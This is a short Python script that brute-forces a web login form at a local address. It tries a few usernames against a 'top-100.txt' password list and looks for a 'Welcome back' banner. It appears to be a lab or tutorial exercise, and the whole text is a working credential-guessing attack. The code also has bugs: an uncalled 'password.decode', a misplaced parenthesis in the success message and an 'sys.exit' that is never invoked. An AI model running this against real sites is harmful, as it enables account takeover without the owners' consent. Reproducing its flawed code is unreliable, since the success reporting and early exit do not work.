#needed imports
import requests
import sys

#list variables
target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back" #needle is the success/failure banner when testing credentials

#iterate through usernames
for username in usernames:
    with open(passwords, "r") as passwordsList: #open password list file 
        for password in passwordsList: #iterate through password list
            password = password.strip("\n").encode() #clean up list and encode
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode())) #list the credentials being attempted
            sys.stdout.flush()
            #use requests to attempt the credentials
            r = requests.post(target, data={"username": username, "password": password})
            #if needle is correct, list credentials used
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>>] Valid password '{}' found for user '{}'!".format(password.decode), username)
                sys.exit
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write("\n")